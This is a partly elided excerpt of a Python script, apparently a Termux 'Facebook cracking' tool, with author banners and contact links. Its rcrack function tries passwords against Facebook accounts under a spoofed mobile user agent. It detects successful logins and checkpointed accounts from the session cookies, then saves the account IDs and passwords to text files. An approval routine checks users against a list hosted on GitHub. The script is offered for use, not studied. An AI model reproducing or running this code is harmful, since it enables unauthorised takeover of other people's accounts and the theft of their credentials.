...
os.system('xdg-open http://wa.me/+01325846157')
...
→   Owner      :  SHAMIM FB  KING 
→   Facebook   :  MD Sumon 
→   Github     : Termux Hacker KING CYBER
→   Tools      :  RANDOM 
\x1b[1;34m→   Version    :  0.2
\33[1;35m     NAME        : <SERAJULDEN><SHAMIM>
...
def riaz():
	...
	if riaz1 =='5':
		riaz()
	if riaz1 =='4':
		os.system('xdg-open http://wa.me/+01325846157?text=Billal Hossen💜🐰Sir😪💕')
	if riaz1 =='3':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100068309627123');riaz()
	if riaz1 =='2':
		bangla()
	else:
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[SHAMIM-OK] '+cid+'|'+ps+'\033[0;97m')
                open('SHAMIM-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[SHAMIM-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('SHAMIM-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mSHAMIM-XD\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
def approval():
  ...
  try:
    httpCaht = requests.get('https://github.com/Termux-shamim-FB-cyber/main/Approve.txt').text
    if id in httpCaht:
